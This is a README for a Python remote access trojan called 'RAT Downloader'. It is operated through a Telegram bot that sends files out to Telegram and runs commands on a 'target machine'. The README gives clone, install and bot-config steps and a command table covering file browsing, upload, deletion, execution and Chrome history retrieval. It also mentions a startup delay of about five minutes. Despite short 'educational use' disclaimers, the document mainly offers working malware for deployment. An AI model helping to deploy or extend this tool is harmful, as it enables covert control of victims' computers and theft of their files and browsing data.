RAT Downloader
 Features

📂 Browse directories remotely

⬇️ Upload/download files via Telegram

⚡ Execute commands on the target machine

🌐 View Chrome browser history

🐍 Lightweight Python tool for educational purposes

💡 Note: For educational and authorized testing only. Misuse is your responsibility.

🛠 Requirements

Python 3.8+

Telegram bot token

Telegram chat ID

Internet connection

Python dependencies:

pip install -r requirements.txt


config.py should contain:

BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
API_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/"

⚙️ Installation

Clone the repository:

git clone https://github.com/cmdkill3r/RAT-Downloader.git
cd RAT-Downloader


Install dependencies:

pip install -r requirements.txt


Configure your bot credentials in config.py.

🎮 Usage

Run the bot:

python main.py


⏱ After ~5 minutes boot delay, the bot will start.
Interact via Telegram commands.

📝 Commands
Command	Description
pwd	Show current directory
ls	List files and folders
cd <dir>	Change directory
upload <file>	Upload file to Telegram
send <file>	Alias of upload
cp <src> <dst>	Copy file
mv <src> <dst>	Move or rename file
rm <file>	Delete file
mkdir <folder>	Create folder
run/exec <file>	Execute file
cat <file>	Show first 4k characters of a file
head <file> [n]	Show first n lines
tail <file> [n]	Show last n lines
history chrome	Retrieve last 12h of Chrome history
exit	Shut down bot

⚠️ Warning: Using this tool on unauthorized systems is illegal.

📂 Files Included

main.py → Main bot script

config.py → Telegram bot configuration

requirements.txt → Python dependencies

🗺 Flow Diagram
+-------------------+
|   User (Telegram) |
+---------+---------+
          |
          v
+-------------------+
|  Telegram Bot API |
+---------+---------+
          |
          v
+-------------------+
|   RAT Downloader  |
|   (main.py)       |
+-------------------+
          |
          v
+-------------------+
| Target Machine FS |
| Commands / Files  |
+-------------------+


🔄 Telegram messages control the bot; files and commands flow between the bot and the target machine.

🌐 GitHub

For updates, issues, and more tools: cmdkill3r
